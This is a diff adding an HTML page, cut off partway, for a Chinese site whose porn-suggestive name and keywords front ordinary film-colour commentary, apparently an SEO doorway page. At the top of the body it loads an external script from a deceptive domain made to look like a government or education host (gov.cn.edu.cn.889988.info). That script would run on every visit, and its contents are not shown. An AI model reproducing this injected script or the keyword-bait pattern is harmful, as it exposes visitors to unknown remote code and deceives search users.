@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="三级黄色电影网 - 用红、黄、蓝三原色读电影。三级黄色片单、三级黄色导演、三级黄色情绪、三级黄色设备、三级黄色避坑与观影指南，覆盖电影色彩、电影配色、电影调色、4K 修复、正版观影。">
+<meta name="keywords" content="三级黄色电影网,三级黄色电影,电影色彩,电影配色,电影调色,三原色,色彩心理学,红色电影,蓝色电影,黄色电影,韦斯安德森,王家卫,是枝裕和,4K修复,杜比视界,观影指南,正版观影">
+<meta name="author" content="三级黄色电影网">
+<meta name="theme-color" content="#f4f1ea">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<title>三级黄色电影网 · 用三原色读电影</title>
+<link rel="canonical" href="https://sanjihuangsedianyingwang-cn.github.io/">
+<style>
+:root{
+  --R:#e0362b; --Y:#f2b21d; --B:#2257c9;
+  --ink:#14181f; --paper:#f4f1ea; --mute:#6c7684;
+  --mono:ui-monospace,Menlo,Consolas,monospace;
+  --sans:"PingFang SC","Microsoft YaHei",Inter,system-ui,sans-serif;
+  --serif:"Songti SC","SimSun",Georgia,serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:var(--sans);background:var(--paper);color:var(--ink);line-height:1.85;font-size:14.8px;overflow-x:hidden;
+  background-image:repeating-linear-gradient(90deg,transparent 0 1px,rgba(20,24,31,.035) 1px 4px)}
+a{color:inherit;text-decoration:none;outline:none}
+a:focus-visible,button:focus-visible,input:focus-visible{outline:2.5px solid var(--B);outline-offset:3px}
+::selection{background:var(--Y);color:#14181f}
+::placeholder{font-family:var(--mono);font-size:10.6px;letter-spacing:1px;color:#9aa3ae}
+.wrap{max-width:1250px;margin:0 auto;padding:0 32px;position:relative}
+
+/* topbar */
+.topbar{position:sticky;top:0;z-index:50;background:rgba(244,241,234,.97);backdrop-filter:blur(9px);border-bottom:3px solid var(--ink)}
+.hd{display:flex;align-items:center;gap:18px;padding:13px 0;font-family:var(--sans)}
+.logo{display:flex;align-items:center;gap:13px;white-space:nowrap}
+.logo .tri{width:42px;height:42px;flex:none;display:grid;grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr;border:2.4px solid var(--ink);border-radius:4px;overflow:hidden;transform:rotate(-4deg)}
+.logo .tri i{display:block}
+.logo .tri i:nth-child(1){background:var(--R);grid-column:1;grid-row:1/3}
+.logo .tri i:nth-child(2){background:var(--Y)}
+.logo .tri i:nth-child(3){background:var(--B)}
+.logo b{font-size:19.6px;font-weight:900;letter-spacing:1.5px}
+.logo em{font-style:normal;font-family:var(--mono);font-size:8.4px;letter-spacing:2.6px;color:var(--mute);display:block;font-weight:700}
+.eyebrow{font-family:var(--mono);font-size:8.2px;letter-spacing:3.4px;color:var(--mute);font-weight:700}
+nav{display:flex;gap:3px;margin-left:auto;font-size:11.6px;letter-spacing:.7px;font-weight:900}
+nav a{padding:9px 12px;border-radius:4px;transition:.22s}
+nav a:hover{background:var(--ink);color:var(--Y);transform:translateY(-3px)}
+.search{display:flex;background:#fff;border:2.4px solid var(--ink);border-radius:4px;padding:5px 5px 5px 13px;gap:8px;width:100%;max-width:250px}
+.search input{border:0;background:transparent;font:inherit;font-size:12.4px;flex:1;color:var(--ink);outline:none}
+.search button{border:0;border-radius:3px;background:var(--B);color:#fff;font-weight:900;font-size:10.6px;padding:0 15px;letter-spacing:1.3px;cursor:pointer}
+.ham{display:none;background:none;border:2.4px solid var(--ink);font-size:18px;cursor:pointer;line-height:1;padding:5px 10px;color:var(--ink)}
+
+/* hero */
+.hero{padding:36px 0 30px}
+.hero .wrap{display:grid;grid-template-columns:1.05fr .95fr;gap:44px;align-items:center}
+.hero h1{font-size:clamp(29px,5.8vw,54px);line-height:1.28;font-weight:900;letter-spacing:.4px;margin:12px 0 16px}
+.hero h1 .three{display:inline-flex;gap:7px;vertical-align:middle;margin:0 4px}
+.hero h1 .three u{width:19px;height:19px;border:2.4px solid var(--ink);border-radius:50%;text-decoration:none;display:inline-block}
+.hero h1 .three u.r{background:var(--R)}.hero h1 .three u.y{background:var(--Y)}.hero h1 .three u.b{background:var(--B)}
+.hero .lead{color:#42505e;font-size:14.8px;max-width:58ch;text-align:justify;line-height:1.95}
+.hero .lead b{color:var(--B)}
+.hero .cta{display:flex;gap:12px;margin-top:20px;flex-wrap:wrap}
+.hero .cta a{font-size:12.4px;font-weight:900;letter-spacing:1.1px;padding:13px 26px;border-radius:4px;transition:.26s;border:2.4px solid var(--ink)}
+.hero .cta a.p{background:var(--R);color:#fff;box-shadow:7px 7px 0 var(--Y)}
+.hero .cta a.s{background:transparent;color:var(--ink)}
+.hero .cta a:hover{transform:translateY(-5px)}
+
+/* palette mixer */
+.mixer{display:grid;grid-template-columns:1fr 1fr;gap:18px;background:var(--ink);color:var(--paper);border-radius:8px;padding:22px 24px;box-shadow:0 24px 60px -26px rgba(20,24,31,.65);transform:rotate(.5deg)}
+.mixer .panel{border:2px solid rgba(255,255,255,.18);border-radius:6px;padding:16px 18px;cursor:pointer;transition:.28s;background:var(--c)}
+.mixer .panel:hover{transform:scale(1.035) rotate(1.4deg);border-color:#fff}
+.mixer .panel .k{font-family:var(--mono);font-size:8px;letter-spacing:2.6px;color:var(--ink);background:var(--paper);display:inline-block;padding:4px 10px;border-radius:3px;font-weight:900}
+.mixer .panel h4{font-size:19px;margin:9px 0 6px;font-weight:900;line-height:1.4}
+.mixer .panel p{font-size:11px;line-height:1.8;color:rgba(20,24,31,.82)}
+.mixer .foot{font-family:var(--mono);font-size:8.4px;letter-spacing:2px;color:var(--Y);margin-top:14px;font-weight:700}
+
+section{padding:46px 0}
+.sec{display:flex;align-items:baseline;gap:11px;flex-wrap:wrap;border-bottom:3px solid var(--ink);padding-bottom:8px;margin-bottom:23px}
+.sec .no{font-family:var(--mono);font-size:11.4px;color:#fff;background:var(--ink);border-radius:3px;padding:5px 12px;font-weight:900;line-height:1.5}
+.sec h2{font-size:clamp(17px,2.7vw,23px);font-weight:900;letter-spacing:.3px}
+.sec .en{font-family:var(--mono);font-size:8.2px;letter-spacing:2.4px;color:var(--mute);text-transform:uppercase;font-weight:700}
+.sec a.more{margin-left:auto;font-size:11.4px;letter-spacing:.7px;color:var(--mute);border-bottom:2px solid var(--R);padding-bottom:2px;font-weight:900}
+.sec a.more:hover{color:var(--R)}
+
+/* 01 tricolor cards */
+.tri3{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.tc{position:relative;min-height:288px;border:2.6px solid var(--ink);border-radius:7px;padding:19px 18px 17px;overflow:hidden;cursor:pointer;transition:.3s;color:var(--paper);background:var(--c)}
+.tc .big{position:absolute;right:-14px;bottom:-22px;font-family:var(--serif);font-size:86px;line-height:1;font-weight:900;color:rgba(255,255,255,.19);transition:.4s}
+.tc .rgb{font-family:var(--mono);font-size:7.8px;letter-spacing:2.4px;background:rgba(255,255,255,.2);display:inline-block;padding:4px 10px;border-radius:3px;font-weight:900}
+.tc h4{font-size:21px;margin:11px 0 8px;font-weight:900;line-height:1.4}
+.tc p{font-size:11.4px;line-height:1.9;text-align:justify;display:-webkit-box;-webkit-line-clamp:6;-webkit-box-orient:vertical;overflow:hidden;color:rgba(255,255,255,.9)}
+.tc .ex{margin-top:11px;font-family:var(--mono);font-size:8.4px;letter-spacing:.9px;border-top:1.4px dashed rgba(255,255,255,.45);padding-top:8px;font-weight:700}
+.tc:hover{transform:translateY(-10px) rotate(-1deg);box-shadow:11px 11px 0 var(--ink)}
+.tc:hover .big{transform:scale(1.14)}
+
+/* 02 list */
+.reel{display:grid;grid-template-columns:repeat(3,1fr);gap:0;border:2.6px solid var(--ink);border-radius:7px;overflow:hidden;background:#fff}
+.rl{padding:20px 22px;border-left:1px solid #dfe3e8;border-top:1px solid #dfe3e8;transition:.26s}
+.rl:nth-child(odd){border-left:0}
+.rl:nth-child(-n+3){border-top:0}
+.rl:hover{background:var(--c);cursor:pointer}
+.rl:hover h4,.rl:hover p,.rl:hover .film{color:var(--paper)}
+.rl .rom{font-family:var(--serif);font-size:24px;line-height:1;color:var(--c);font-weight:900;transition:.26s}
+.rl h4{font-size:15.6px;margin:7px 0 7px;font-weight:900;line-height:1.5}
+.rl p{font-size:11px;color:var(--mute);line-height:1.85;text-align:justify;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.rl .film{font-family:var(--mono);font-size:8.2px;letter-spacing:1.4px;color:var(--ink);border-top:1.4px dashed var(--c);margin-top:9px;padding-top:7px;font-weight:700}
+
+/* 03 bars */
+.bars{display:grid;grid-template-columns:1.05fr .95fr;gap:30px;align-items:start}
+.barcard{background:#fff;border:2.6px solid var(--ink);border-radius:7px;padding:20px 24px;box-shadow:9px 9px 0 var(--c)}
+.barcard .row{display:grid;grid-template-columns:62px 1fr 52px;gap:13px;align-items:center;margin-bottom:13px}
+.barcard .row:last-child{margin-bottom:0}
+.barcard .row span:first-child{font-family:var(--mono);font-size:9.6px;letter-spacing:.8px;font-weight:900;color:var(--mute)}
+.barcard .track{height:16px;border-radius:9px;background:#e7e4dc;overflow:hidden;border:1.2px solid var(--ink)}
+.barcard .track i{display:block;height:100%;border-radius:9px;background:linear-gradient(90deg,var(--c),var(--Y));width:0;transition:width 1.1s cubic-bezier(.2,.8,.2,1)}
+.barcard .row span:last-child{font-family:var(--mono);font-size:12px;font-weight:900;text-align:right;color:var(--c)}
+.quote{position:relative;background:var(--Y);border:2.6px solid var(--ink);border-radius:7px;padding:26px 26px 22px;box-shadow:9px 9px 0 var(--R);transform:rotate(-.6deg)}
+.quote:before{content:"“";font-family:var(--serif);font-size:74px;line-height:.6;position:absolute;right:14px;top:8px;color:rgba(20,24,31,.22)}
+.quote h4{font-size:18.6px;line-height:1.7;font-weight:900;margin-bottom:11px;position:relative}
+.quote p{font-size:12px;line-height:1.9;text-align:justify;color:rgba(20,24,31,.84)}
+.quote .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:13px}
+.quote .tags b{font-family:var(--mono);font-size:8.2px;letter-spacing:1.2px;background:var(--ink);color:var(--Y);border-radius:10px;padding:5px 12px;font-weight:700}
+
+/* 04 auteurs */
+.auth{display:grid;grid-template-columns:repeat(3,1fr);gap:15px}
+.au{position:relative;border:2.6px solid var(--ink);border-radius:7px;padding:18px 18px 16px;background:#fff;overflow:hidden;cursor:pointer;transition:.28s}
+.au .sw{display:flex;gap:5px;margin-bottom:11px}
+.au .sw i{width:15px;height:15px;border:1.6px solid var(--ink);border-radius:50%;display:block}
+.au h4{font-size:17.4px;font-weight:900;line-height:1.45}
+.au .en2{font-family:var(--mono);font-size:8px;letter-spacing:1.8px;color:var(--mute);margin:4px 0 8px;font-weight:700}
+.au p{font-size:11px;color:var(--mute);line-height:1.85;text-align:justify;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.au .see{margin-top:10px;font-family:var(--mono);font-size:8.4px;letter-spacing:1.4px;color:var(--c);border-top:1.4px dashed var(--c);padding-top:7px;font-weight:700}
+.au:hover{background:var(--c);transform:translateX(7px)}
+.au:hover p,.au:hover .en2{color:rgba(255,255,255,.85)}
+.au:hover h4{color:#fff}
+
+/* 05 devices */
+.dev{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:2.6px solid var(--ink);border-radius:7px;overflow:hidden;background:#fff}
+.dv{padding:20px 20px 18px;border-left:1px solid #dfe3e8;transition:.26s}
+.dv:nth-child(odd){border-left:0}
+.dv:hover{background:var(--c);cursor:pointer}
+.dv:hover .nm,.dv:hover p,.dv:hover .spec{color:var(--paper)}
+.dv .ic{width:44px;height:44px;border:2.4px solid var(--ink);border-radius:5px;background:var(--paper);display:grid;place-items:center;font-size:21px;line-height:1;transition:.26s}
+.dv .nm{font-size:15.4px;font-weight:900;margin:11px 0 6px;line-height:1.45;transition:.26s}
+.dv p{font-size:10.8px;color:var(--mute);line-height:1.85;text-align:justify}
+.dv .spec{font-family:var(--mono);font-size:8.2px;letter-spacing:1.2px;border-top:1.4px dashed var(--c);margin-top:10px;padding-top:7px;font-weight:700;transition:.26s}
+
+/* 06 steps */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:13px}
+.st{position:relative;border:2.6px solid var(--ink);border-radius:7px;padding:19px 18px 17px;background:#fff;cursor:pointer;transition:.28s;overflow:hidden}
+.st .num{font-family:var(--serif);font-size:46px;line-height:.9;font-weight:900;color:rgba(20,24,31,.13);position:absolute;right:9px;bottom:-4px;transition:.3s}
+.st .key{font-family:var(--mono);font-size:8px;letter-spacing:2.2px;color:#fff;background:var(--c);display:inline-block;padding:5px 11px;border-radius:3px;font-weight:900}
+.st h4{font-size:14.8px;margin:10px 0 6px;font-weight:900;line-height:1.5;position:relative}
+.st p{font-size:10.8px;color:var(--mute);line-height:1.85;text-align:justify;position:relative}
+.st:hover{transform:translateY(-8px);box-shadow:9px 9px 0 var(--c)}
+.st:hover .num{color:rgba(255,255,255,.35);transform:scale(1.12)}
+
+/* 07 avoid */
+.avoid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.av{background:#fff;border:2.6px solid var(--ink);border-left:9px solid var(--R);border-radius:5px;padding:18px 20px;cursor:pointer;transition:.26s}
+.av:hover{transform:translateX(7px);background:#fff6f4}
+.av .no{font-family:var(--mono);font-size:8.4px;letter-spacing:2.2px;color:var(--R);font-weight:900}
+.av h4{font-size:15px;margin:7px 0 7px;font-weight:900;line-height:1.45}
+.av p{font-size:11px;color:var(--mute);line-height:1.85;text-align:justify}
+
+/* about */
+.about{background:var(--ink);color:var(--paper);border-radius:9px;padding:34px 38px;box-shadow:0 26px 66px -28px rgba(20,24,31,.72);transform:rotate(-.4deg)}
+.about p.led{font-size:19px;line-height:1.85;font-weight:900;margin-bottom:14px;color:#fff}
+.about p.led b{color:var(--Y)}
+.about p{font-size:13.6px;text-align:justify;margin-bottom:13px;line-height:1.95;color:#cdd4dd}
+.tags2{display:flex;gap:9px;flex-wrap:wrap}
+.tags2 a{font-family:var(--mono);font-size:9.2px;letter-spacing:.8px;color:var(--Y);border:1.8px solid var(--Y);border-radius:13px;padding:6px 14px;transition:.22s;font-weight:700;background:rgba(242,178,29,.07)}
+.tags2 a:hover{background:var(--Y);color:var(--ink);transform:rotate(-2.6deg)}
+
+/* footer */
+footer{border-top:3px solid var(--ink);padding:40px 0 16px;margin-top:12px;background:rgba(244,241,234,.6)}
+.foot{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:28px;margin-bottom:22px}
+.foot .brand{font-size:18px;font-weight:900;color:var(--ink);display:flex;flex-direction:column;gap:9px;letter-spacing:1.1px}
+.foot .brand p{font-size:11.8px;color:var(--mute);line-height:1.9;max-width:330px;font-weight:700}
+.foot h5{font-family:var(--mono);font-size:8.2px;letter-spacing:2.4px;color:var(--B);margin-bottom:10px;font-weight:700}
+.foot a{display:block;color:var(--mute);font-size:11.6px;padding:4px 0;font-weight:700;transition:.18s}
+.foot a:hover{color:var(--R);transform:translateX(5px)}
+.copy{text-align:center;color:#7c8794;font-size:10.2px;border-top:2px dashed #c9cfd6;padding-top:14px;line-height:2;font-family:var(--mono);letter-spacing:.5px}
+.copy a{color:var(--B);font-weight:700}
+
+@media(max-width:1100px){
+  .ham{display:block}
+  nav,.search{display:none}
+  .hero .wrap,.tri3,.reel,.auth,.dev,.foot{grid-template-columns:repeat(2,1fr)}
+  .bars{grid-template-columns:1fr}
+  .steps,.avoid{grid-template-columns:repeat(2,1fr)}
+  .drawer{position:fixed;inset:0 0 0 auto;width:86%;max-width:330px;background:var(--paper);padding:28px;border-left:8px solid var(--R);transform:translateX(102%);transition:.32s;z-index:60;overflow:auto;box-shadow:-18px 0 40px rgba(0,0,0,.32)}
+  .drawer.open{transform:none}
+  .drawer a{display:block;font-size:16px;font-weight:900;padding:14px 10px;border-bottom:2px dashed rgba(224,54,43,.35);color:var(--ink)}
+  .drawer a:hover{color:var(--B)}
+  .scrim{position:fixed;inset:0;background:rgba(20,24,31,.5);opacity:0;pointer-events:none;transition:.32s;z-index:59}
+  .scrim.on{opacity:1;pointer-events:auto}
+  .tc,.au,.dv{min-height:180px}
+}
+@media(max-width:620px){
+  .wrap{padding:0 16px}
+  .tri3,.reel,.auth,.dev,.foot{grid-template-columns:1fr}
+  .steps,.avoid{grid-template-columns:1fr}
+  .hero h1{font-size:28px}
+  .mixer{grid-template-columns:1fr}
+  .mixer .panel{min-height:150px}
+}
+@media print{body{background:#fff;color:#000}.ham,.search,.scrim,.drawer,.topbar{position:static!important;display:none!important}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <div class="hd">
+      <a class="logo" href="#" aria-label="三级黄色电影网 首页">
+        <span class="tri" aria-hidden="true"><i></i><i></i><i></i></span>
+        <span><b>三级黄色电影网</b><em>PRIMARY COLORS · SINCE 2026</em></span>
+      </a>
+      <nav>
+        <a href="#c01">三级黄色</a>
+        <a href="#c02">片单</a>
+        <a href="#c03">色榜</a>
+        <a href="#c04">作者</a>
+        <a href="#c05">设备</a>
+        <a href="#c06">指南</a>
+      </nav>
+      <div class="search" role="search">
+        <input type="search" placeholder="搜颜色、导演、片名、情绪" aria-label="搜索">
+        <button aria-label="搜索">搜</button>
+      </div>
+      <button class="ham" id="ham" aria-label="菜单" aria-expanded="false">☰</button>
+    </div>
+  </div>
+  <div class="drawer" id="drawer" aria-label="移动端导航">
+    <a href="#c01">红 · 黄 · 蓝 三级黄色</a>
+    <a href="#c02">三级黄色片单</a>
+    <a href="#c03">三级黄色榜</a>
+    <a href="#c04">三级黄色导演</a>
+    <a href="#c05">三级黄色设备</a>
+    <a href="#c06">挑片四步</a>
+    <a href="#c07">避坑清单</a>
+    <a href="#about">关于本站</a>
+  </div>
+  <div class="scrim" id="scrim"></div>
+</div>
+
+<main>
+
+  <!-- hero -->
+  <section class="hero">
+    <div class="wrap">
+      <div>
+        <div class="eyebrow">// READ FILMS IN RED · YELLOW · BLUE</div>
+        <h1>三级黄色电影网<br>用<span class="three"><u class="r"></u><u class="y"></u><u class="b"></u></span>读电影。</h1>
+        <p class="lead">红是欲望与危险，黄是疯狂与荒诞，蓝是孤独与自由。本站按<b>颜色</b>而不是按类型挑片：三级黄色片单、三级黄色导演、三级黄色情绪、三级黄色设备，以及一份不踩坑的观影指南。不托管资源、不提供盗链、不做违规采集，倡导支持正版与 4K 修复版。</p>
+        <div class="cta">
+          <a class="p" href="#c02">看三级黄色片单</a>
+          <a class="s" href="#c06">挑片四步</a>
+        </div>
+      </div>
+      <div class="mixer" aria-label="三级黄色调色盘">
+        <a class="panel" href="#c01" style="--c:var(--R)"><span class="k">RGB 255·42·43</span><h4>红 · 欲望</h4><p>爱、血、权力、危险。红色一出场，情绪就绷紧了。</p></a>
+        <a class="panel" href="#c01" style="--c:var(--Y)"><span class="k">RGB 242·178·29</span><h4>黄 · 荒诞</h4><p>疯狂、公路、金色黄昏与一地鸡毛。黄色是笑声里的不安。</p></a>
+        <a class="panel" href="#c01" style="--c:var(--B)"><span class="k">RGB 34·87·201</span><h4>蓝 · 孤独</h4><p>夜晚、大海、雨、未说出口的话。蓝色一出现，就安静了。</p></a>
+        <a class="panel" href="#c02" style="--c:#3fcf8f"><span class="k">MIX · TEAL &amp; ORANGE</span><h4>青橙 · 好莱坞</h4><p>最通用的电影配色：冷阴影 + 暖皮肤。学会识别，就学会一半调色。</p></a>
+        <div class="foot">// 三原色可混出所有颜色，正如三种情绪可混出所有故事</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 01 tricolor -->
+  <section id="c01" class="wrap">
+    <div class="sec">
+      <span class="no">01</span>
+      <h2>红 · 黄 · 蓝 · 电影的三种底色</h2>
+      <span class="en">Three Colors</span>
+      <a class="more" href="#">完整色谱 ›</a>
+    </div>
+    <div class="tri3">
+      <a class="tc" href="#" style="--c:var(--R)"><span class="big">红</span><span class="rgb">RED · 欲望</span><h4>红色电影</h4><p>基耶斯洛夫斯基《红》、阿莫多瓦《关于我母亲的一切》、王家卫《花样年华》。红是欲望，也是危险；是婚纱，也是血。看红色，先看它在画面里占多大面积。</p><span class="ex">EX · 《红》1994 / 《燃烧女子的肖像》</span></a>
+      <a class="tc" href="#" style="--c:var(--Y)"><span class="big">黄</span><span class="rgb">YELLOW · 荒诞</span><h4>黄色电影</h4><p>《猜火车》《小丑》《寄生虫》《荒野猎人》。黄是偏执、是黄昏、是贫民区的墙、是疯子脸上的笑。黄色画面很难调，容易脏。</p><span class="ex">EX · 《乔乔的异想世界》 / 《疯狂的麦克斯》</span></a>
+      <a class="tc" href="#" style="--c:var(--B)"><span class="big">蓝</span><span class="rgb">BLUE · 孤独</span><h4>蓝色电影</h4><p>《蓝白红三部曲之蓝》《海边的曼彻斯特》《驾驶我的车》。蓝是夜、是海、是雨、是未说出口。蓝色最考验曝光与白平衡。</p><span class="ex">EX · 《蓝色是最温暖的颜色》 / 《降临》</span></a>
+    </div>
+  </section>
+
+  <!-- 02 reels -->
+  <section id="c02" class="wrap">
+    <div class="sec">
+      <span class="no">02</span>
+      <h2>三级黄色片单 · 每色三部，够看一个周末</h2>
+      <span class="en">Reels</span>
+      <a class="more" href="#">完整片单 ›</a>
+    </div>
+    <div class="reel">
+      <a class="rl" href="#" style="--c:var(--R)"><div class="rom">Ⅰ</div><h4>红 · 欲望</h4><p>《红》《花样年华》《燃烧女子的肖像》。三部都在讲"差一点就说出口"。</p><span class="film">3 部 · 约 318 分钟</span></a>
+      <a class="rl" href="#" style="--c:var(--R)"><div class="rom">Ⅱ</div><h4>红 · 危险</h4><p>《老男孩》《穆赫兰道》《消失的爱人》。红色在这里是警报。</p><span class="film">3 部 · 约 396 分钟</span></a>
+      <a class="rl" href="#" style="--c:var(--R)"><div class="rom">Ⅲ</div><h4>红 · 权力</h4><p>《教父》《霸王别姬》《辛德勒的名单》。红是权力，也是代价。</p><span class="film">3 部 · 约 555 分钟</span></a>
+      <a class="rl" href="#" style="--c:var(--Y)"><div class="rom">Ⅳ</div><h4>黄 · 荒诞</h4><p>《猜火车》《小丑》《寄生虫》。黄色喜剧的笑点，都在阶级上。</p><span class="film">3 部 · 约 384 分钟</span></a>
+      <a class="rl" href="#" style="--c:var(--Y)"><div class="rom">Ⅴ</div><h4>黄 · 公路</h4><p>《荒野猎人》《末路狂花》《摩托车日记》。金色黄昏，是最好的结尾光。</p><span class="film">3 部 · 约 426 分钟</span></a>
+      <a class="rl" href="#" style="--c:var(--Y)"><div class="rom">Ⅵ</div><h4>黄 · 童真</h4><p>《月升王国》《布达佩斯大饭店》《了不起的狐狸爸爸》。韦斯·安德森的糖果色。</p><span class="film">3 部 · 约 324 分钟</span></a>
+      <a class="rl" href="#" style="--c:var(--B)"><div class="rom">Ⅶ</div><h4>蓝 · 孤独</h4><p>《蓝》《海边的曼彻斯特》《驾驶我的车》。蓝色适合一个人看。</p><span class="film">3 部 · 约 372 分钟</span></a>
+      <a class="rl" href="#" style="--c:var(--B)"><div class="rom">Ⅷ</div><h4>蓝 · 夜</h4><p>《重庆森林》《堕落天使》《迷失东京》。霓虹蓝，是城市失眠的颜色。</p><span class="film">3 部 · 约 318 分钟</span></a>
+      <a class="rl" href="#" style="--c:var(--B)"><div class="rom">Ⅸ</div><h4>青橙 · 好莱坞</h4><p>《银翼杀手 2049》《疯狂的麦克斯》《蝙蝠侠》。学会看阴影里的青、皮肤上的橙。</p><span class="film">3 部 · 约 444 分钟</span></a>
+    </div>
+  </section>
+
+  <!-- 03 bars + quote -->
+  <section id="c03" class="wrap">
+    <div class="sec">
+      <span class="no">03</span>
+      <h2>三级黄色榜 · 哪种颜色最难忘</h2>
+      <span class="en">Color Index</span>
+      <a class="more" href="#">完整榜单 ›</a>
+    </div>
+    <div class="bars">
+      <div class="barcard" style="--c:var(--B)">
+        <div class="row"><span>BLUE</span><span class="track"><i data-w="94"></i></span><span>9.4</span></div>
+        <div class="row"><span>RED</span><span class="track"><i data-w="89"></i></span><span>8.9</span></div>
+        <div class="row"><span>YELLOW</span><span class="track"><i data-w="82"></i></span><span>8.2</span></div>
+        <div class="row"><span>TEAL/ORANGE</span><span class="track"><i data-w="78"></i></span><span>7.8</span></div>
+        <div class="row"><span>GREEN</span><span class="track"><i data-w="71"></i></span><span>7.1</span></div>
+        <div class="row"><span>B&amp;W</span><span class="track"><i data-w="66"></i></span><span>6.6</span></div>
+        <p style="font-size:11.2px;color:#6c7684;margin-top:13px;line-height:1.9;text-align:justify">数值为"颜色记忆度"主观评分（本站编辑部 2026 年 10 月样本，非权威数据）：观众在观影 30 天后，仍能回忆起的第一个画面颜色。蓝色长期第一——因为孤独比欲望更长久。</p>
+      </div>
+      <div class="quote">
+        <h4>"颜色不是装饰，是台词。导演不敢让角色说出口的话，都给了美术和灯光。"</h4>
+        <p>看片时做一件事：把声音关掉，只看画面 30 秒。你会看懂一半的剧情——因为颜色已经把情绪说完了。再把声音打开，你会发现对白只是确认。</p>
+        <div class="tags"><b>关声音 30 秒</b><b>看阴影</b><b>看肤色</b><b>看道具</b><b>看结尾光</b></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 04 auteurs -->
+  <section id="c04" class="wrap">
+    <div class="sec">
+      <span class="no">04</span>
+      <h2>三级黄色导演 · 认颜色，比认类型快</h2>
+      <span class="en">Auteurs</span>
+      <a class="more" href="#">完整名单 ›</a>
+    </div>
+    <div class="auth">
+      <a class="au" href="#" style="--c:var(--R)"><span class="sw"><i style="background:var(--R)"></i><i style="background:#6b1f2b"></i><i style="background:#f4d8cf"></i></span><h4>王家卫</h4><span class="en2">WONG KAR-WAI</span><p>霓虹红、钨丝黄、雨夜蓝。他的颜色是"时间"：越想留住，越偏色。</p><span class="see">SEE · 6 部 · 从《阿飞正传》入门</span></a>
+      <a class="au" href="#" style="--c:var(--Y)"><span class="sw"><i style="background:var(--Y)"></i><i style="background:#f6e6b8"></i><i style="background:#5c4a1f"></i></span><h4>韦斯·安德森</h4><span class="en2">WES ANDERSON</span><p>对称构图 + 糖果色 + 居中人物。他的黄色不是悲伤，是刻意的不真实。</p><span class="see">SEE · 5 部 · 从《月升王国》入门</span></a>
+      <a class="au" href="#" style="--c:var(--B)"><span class="sw"><i style="background:var(--B)"></i><i style="background:#9db6e8"></i><i style="background:#0d2a66"></i></span><h4>基耶斯洛夫斯基</h4><span class="en2">KRZYSZTOF KIESLOWSKI</span><p>《蓝白红》三部曲：颜色即主题。蓝是自由，白是平等，红是博爱。</p><span class="see">SEE · 3 部 · 按蓝→白→红顺序</span></a>
+      <a class="au" href="#" style="--c:#3fcf8f"><span class="sw"><i style="background:#3fcf8f"></i><i style="background:#eaf6f0"></i><i style="background:#1f6b48"></i></span><h4>是枝裕和</h4><span class="en2">HIROKAZU KORE-EDA</span><p>低饱和、自然光、家常色。他的绿色是"活着"：不抒情，只记录。</p><span class="see">SEE · 6 部 · 从《步履不停》入门</span></a>
+      <a class="au" href="#" style="--c:#c2674f"><span class="sw"><i style="background:#c2674f"></i><i style="background:#f0ddd4"></i><i style="background:#5c3526"></i></span><h4>奉俊昊</h4><span class="en2">BONG JOON-HO</span><p>用颜色分阶级：《寄生虫》里，穷人家的灯是黄的，富人家的草是绿的。</p><span class="see">SEE · 5 部 · 从《杀人回忆》入门</span></a>
+      <a class="au" href="#" style="--c:#8b7bd8"><span class="sw"><i style="background:#8b7bd8"></i><i style="background:#e3def6"></i><i style="background:#3d2f6b"></i></span><h4>新海诚</h4><span class="en2">MAKOTO SHINKAI</span><p>高饱和天空蓝 + 夕焼け橙。他的颜色是"距离"：想见的人，总在另一片天空下。</p><span class="see">SEE · 4 部 · 从《你的名字。》入门</span></a>
+    </div>
+  </section>
+
+  <!-- 05 devices -->
+  <section id="c05" class="wrap">
+    <div class="sec">
+      <span class="no">05</span>
+      <h2>三级黄色设备 · 看对颜色，先有对屏</h2>
+      <span class="en">Devices</span>
+      <a class="more" href="#">完整清单 ›</a>
+    </div>
+    <div class="dev">
+      <a class="dv" href="#" style="--c:var(--R)"><span class="ic">🖥</span><div class="nm">校色显示器</div><p>99% sRGB 是底线，P3 更好。先看准颜色，再谈喜欢什么颜色。每月校色一次。</p><span class="spec">REQ · 4K / P3 / 硬件校色</span></a>
+      <a class="dv" href="#" style="--c:var(--Y)"><span class="ic">🎛</span><div class="nm">色卡与灰阶</div><p>X-Rite ColorChecker 或 Spyder。拍前拍一张，后期白平衡就有了锚点。</p><span class="spec">REQ · 24 色 / 灰阶 21 阶</span></a>
+      <a class="dv" href="#" style="--c:var(--B)"><span class="ic">🎧</span><div class="nm">监听耳机</div><p>颜色是给眼睛的，声音是给身体的。关灯、戴耳机，才是完整观影。</p><span class="spec">REQ · 封闭式 / 平直频响</span></a>
+      <a class="dv" href="#" style="--c:#3fcf8f"><span class="ic">💿</span><div class="nm">蓝光与修复版</div><p>流媒体压缩会吃掉 30% 的颜色。想看真色彩，找 4K 修复版或正版蓝光。</p><span class="spec">REQ · 4K UHD / SDR 或 HDR10</span></a>
+    </div>
+  </section>
+
+  <!-- 06 steps -->
+  <section id="c06" class="wrap">
+    <div class="sec">
+      <span class="no">06</span>
+      <h2>挑片四步 · 按颜色挑，比按类型准</h2>
+      <span class="en">How to Pick</span>
+      <a class="more" href="#">完整方法 ›</a>
+    </div>
+    <div class="steps">
